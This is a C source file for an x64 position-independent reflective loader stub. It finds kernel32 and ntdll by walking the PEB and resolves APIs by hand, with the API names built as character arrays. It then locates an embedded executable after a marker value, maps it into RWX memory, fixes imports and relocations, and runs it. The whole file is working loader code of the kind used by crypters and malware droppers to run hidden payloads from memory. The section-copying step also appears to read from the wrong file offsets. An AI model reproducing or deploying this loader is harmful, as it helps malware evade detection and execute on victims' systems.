#include <windows.h>
#include <winternl.h>

/**
 * stub.c - x64 Position Independent Reflective Loader
 */

typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks;
    void* DllBase; void* EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_CUSTOM, *PLDR_DATA_TABLE_ENTRY_CUSTOM;

static inline void* get_k32_base();
static inline void* get_ntdll_base();
static inline void* get_proc_address(void* module, const char* name);
static inline int strings_equal(const char* s1, const char* s2);

__attribute__((section(".text.prologue")))
void stub_entry() {
    void* k32 = get_k32_base();
    void* ntdll = get_ntdll_base();
    if (!k32 || !ntdll) return;

    char sGPA[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    char sLLA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char sVA[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    char sRAFA[] = {'R','t','l','A','d','d','F','u','n','c','t','i','o','n','T','a','b','l','e',0};
    char sVP[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};

    typedef FARPROC (WINAPI *GPA)(HMODULE, LPCSTR);
    typedef HMODULE (WINAPI *LLA)(LPCSTR);
    typedef LPVOID (WINAPI *VA)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *RAFA)(PRUNTIME_FUNCTION, DWORD, DWORD64);
    typedef BOOL (WINAPI *VP)(LPVOID, SIZE_T, DWORD, PDWORD);

    GPA pGPA = (GPA)get_proc_address(k32, sGPA);
    LLA pLLA = (LLA)pGPA((HMODULE)k32, sLLA);
    VA pVA = (VA)pGPA((HMODULE)k32, sVA);
    VP pVP = (VP)pGPA((HMODULE)k32, sVP);
    RAFA pRAFA = (RAFA)pGPA((HMODULE)ntdll, sRAFA);

    unsigned long long marker = 0xDEADBEEFCAFEBABEULL;
    void* rip_ptr; __asm__ ("lea (%%rip), %0" : "=r" (rip_ptr));

    char* s = (char*)rip_ptr;
    int f = 0;
    for (int i=0; i<1024*1024; i++) {
        if (*(unsigned long long*)s == marker) {
            if (*(unsigned short*)(s + 8) == 0x5A4D) { s += 8; f = 1; break; }
        }
        s++;
    }
    if (!f) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)s;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(s + dos->e_lfanew);
    char* base = (char*)pVA(NULL, nt->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base) return;

    for (DWORD i=0; i<nt->OptionalHeader.SizeOfHeaders; i++) base[i] = s[i];
    PIMAGE_SECTION_HEADER sh = (PIMAGE_SECTION_HEADER)((char*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    for (int i=0; i<nt->FileHeader.NumberOfSections; i++) {
        char* dest = base + sh[i].VirtualAddress;
        char* src = s + sh[i].VirtualAddress;
        for (DWORD j=0; j<sh[i].SizeOfRawData; j++) dest[j] = src[j];
    }

    PIMAGE_NT_HEADERS nnt = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    if (nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR id = (PIMAGE_IMPORT_DESCRIPTOR)(base + nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (id->Name) {
            HMODULE hm = pLLA(base + id->Name);
            PIMAGE_THUNK_DATA ft = (PIMAGE_THUNK_DATA)(base + id->FirstThunk);
            PIMAGE_THUNK_DATA ot = (PIMAGE_THUNK_DATA)(base + id->OriginalFirstThunk);
            if (!id->OriginalFirstThunk) ot = ft;
            while (ot->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(ot->u1.Ordinal)) ft->u1.Function = (ULONG_PTR)pGPA(hm, (LPCSTR)IMAGE_ORDINAL(ot->u1.Ordinal));
                else ft->u1.Function = (ULONG_PTR)pGPA(hm, ((PIMAGE_IMPORT_BY_NAME)(base + ot->u1.AddressOfData))->Name);
                ft++; ot++;
            }
            id++;
        }
    }

    ULONG_PTR de = (ULONG_PTR)base - nnt->OptionalHeader.ImageBase;
    if (de != 0 && nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION re = (PIMAGE_BASE_RELOCATION)(base + nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (re->VirtualAddress != 0) {
            DWORD ct = (re->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* li = (WORD*)((char*)re + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i=0; i<ct; i++) {
                if ((li[i] >> 12) == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)(base + re->VirtualAddress + (li[i] & 0xFFF)) += de;
                else if ((li[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)(base + re->VirtualAddress + (li[i] & 0xFFF)) += (DWORD)de;
            }
            re = (PIMAGE_BASE_RELOCATION)((char*)re + re->SizeOfBlock);
        }
    }

    if (pRAFA && nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size > 0) {
        pRAFA((PRUNTIME_FUNCTION)(base + nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress), nnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)base);
    }

    // Set protections
    for (int i=0; i<nnt->FileHeader.NumberOfSections; i++) {
        DWORD p=0, old;
        if (sh[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) p=PAGE_EXECUTE_READWRITE;
            else p=PAGE_EXECUTE_READ;
        } else {
            if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
            else p=PAGE_READONLY;
        }
        pVP(base + sh[i].VirtualAddress, sh[i].Misc.VirtualSize, p, &old);
    }

    ((void(*)())(base + nnt->OptionalHeader.AddressOfEntryPoint))();
}

static inline void* get_k32_base() {
    PPEB p; __asm__ ("movq %%gs:0x60, %0" : "=r" (p));
    PLIST_ENTRY l = &p->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY e = l->Flink->Flink->Flink;
    return ((PLDR_DATA_TABLE_ENTRY_CUSTOM)((char*)e - sizeof(LIST_ENTRY)))->DllBase;
}

static inline void* get_ntdll_base() {
    PPEB p; __asm__ ("movq %%gs:0x60, %0" : "=r" (p));
    PLIST_ENTRY l = &p->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY e = l->Flink->Flink;
    return ((PLDR_DATA_TABLE_ENTRY_CUSTOM)((char*)e - sizeof(LIST_ENTRY)))->DllBase;
}

static inline void* get_proc_address(void* m, const char* n) {
    char* b = (char*)m;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(b + ((PIMAGE_DOS_HEADER)b)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY ex = (PIMAGE_EXPORT_DIRECTORY)(b + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* ns = (DWORD*)(b + ex->AddressOfNames);
    DWORD* fs = (DWORD*)(b + ex->AddressOfFunctions);
    WORD* os = (WORD*)(b + ex->AddressOfNameOrdinals);
    for (DWORD i=0; i<ex->NumberOfNames; i++) if (strings_equal(b + ns[i], n)) return b + fs[os[i]];
    return 0;
}

static inline int strings_equal(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return (unsigned char)*s1 == (unsigned char)*s2;
}
